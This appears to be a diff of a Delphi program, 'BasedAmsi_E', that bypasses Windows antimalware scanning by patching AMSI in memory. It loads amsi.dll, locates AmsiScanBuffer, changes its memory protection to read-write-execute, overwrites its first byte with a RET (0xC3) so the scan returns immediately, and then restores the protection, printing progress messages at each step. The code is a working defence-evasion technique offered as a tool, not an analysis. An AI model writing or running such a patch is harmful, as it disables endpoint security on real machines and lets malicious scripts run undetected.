@@ -8,6 +8,7 @@ program BasedAmsi_E;
 https://www.sunshine2k.de/articles/coding/tut_Patcher.htm
 https://progamercity.net/delphi/245-delphi-memory-modification-tutorial-amp-template.html
 https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
+https://delphi.cjcsoft.net/viewthread.php?tid=42761&extra=page%3D1
 }
 
 uses
@@ -19,24 +20,25 @@ var
   PidHandle: integer;
   PidID : integer;
   Written: UIntPtr;
-
   lib : THandle;
   asb : Pointer;
   NumWrote : SIZE_T;
+  //OldProtect : DWord;
   OldProtect : DWord;
-  garbage : Byte = $C3;
+  RET : Byte = $C3;
 
-type UIntPtr = NativeUInt;
 
+
+//Add bps
+//Step to load
+//Save bin of amsi.dll in memory
+//Step past Protect,Patch,ReProtect
+//Save bin of amsi.dll in memory
+//$(cmp pre-patch.bin post-patch.bin)
 
 
 begin
   try
-  //Init needed
-    //WriteLn(GetWindowThreadProcessId(h, PID));
-    //Proc := OpenProcess(PROCESS_VM_OPERATION or PROCESS_VM_WRITE, false, PID);
-    //WriteLn(Proc);
-
   //Load and get base address for AmsScanBuffer
     lib := LoadLibrary('amsi.dll');
     asb := GetProcAddress(lib,'AmsiScanBuffer');
@@ -46,16 +48,21 @@ begin
 
 
   //Change memory protection to RWX
-    VirtualProtect(asb, SizeOf(garbage), 64, OldProtect);
+    WriteLn('[+] Attempting to change protections');
+    ////VirtualProtect(asb, UIntPtr(SizeOf(garbage)), 64, 0);
+    VirtualProtect(asb, 1, 64, OldProtect);
     WriteLn('[+] RWX protected');
 
-
   //Write to memory @ pter
-    WriteProcessMemory(PidHandle, asb, @garbage, SizeOf(garbage), Written);
-    WriteLn('[+] Written To amsi.dll');
+    WriteLn('[+] Patching with RET (0xC3) of length ', SizeOf(RET));
+    Move(RET, asb^, 1);
 
-  //Change memory protection to RWX
-    VirtualProtect(asb, SizeOf(garbage), 64, OldProtect);
+    //WriteProcessMemory(PidHandle, asb, @garbage, SizeOf(garbage), Written);
+    //WriteLn('[+] Written RET To the start of ScanStringBuffer');
+
+  //Change memory protection to RX
+    VirtualProtect(asb, 1, OldProtect, OldProtect);
+    //VirtualProtect(asb, 1, 4, 0);
     WriteLn('[+] RX protected');
 
 
